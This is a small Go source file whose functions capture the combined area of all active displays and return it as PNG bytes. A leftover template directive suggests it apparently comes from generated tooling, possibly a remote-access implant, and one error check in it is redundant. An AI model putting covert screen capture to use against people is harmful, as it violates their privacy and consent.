package screenopt

import (
	"bytes"
	"image"
	"image/png"

	//{{end}}
	screen "github.com/kbinani/screenshot"
)

//Screenshot - Retrieve the screenshot of the active displays
func Screenshot() (image.Image, error) {
	imgByte, err := LinuxCapture()
	if err != nil {
		return nil, err
	}
	img, _, err := image.Decode(bytes.NewReader(imgByte))
	return img, err
}

// LinuxCapture - Retrieve the screenshot of the active displays
func LinuxCapture() ([]byte, error) {
	nDisplays := screen.NumActiveDisplays()

	var height, width int = 0, 0
	for i := 0; i < nDisplays; i++ {
		rect := screen.GetDisplayBounds(i)
		if rect.Dy() > height {
			height = rect.Dy()
		}
		width += rect.Dx()
	}
	img, err := screen.Capture(0, 0, width, height)

	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	if err != nil {
		return buf.Bytes(), nil
	}

	png.Encode(&buf, img)
	return buf.Bytes(), nil
}
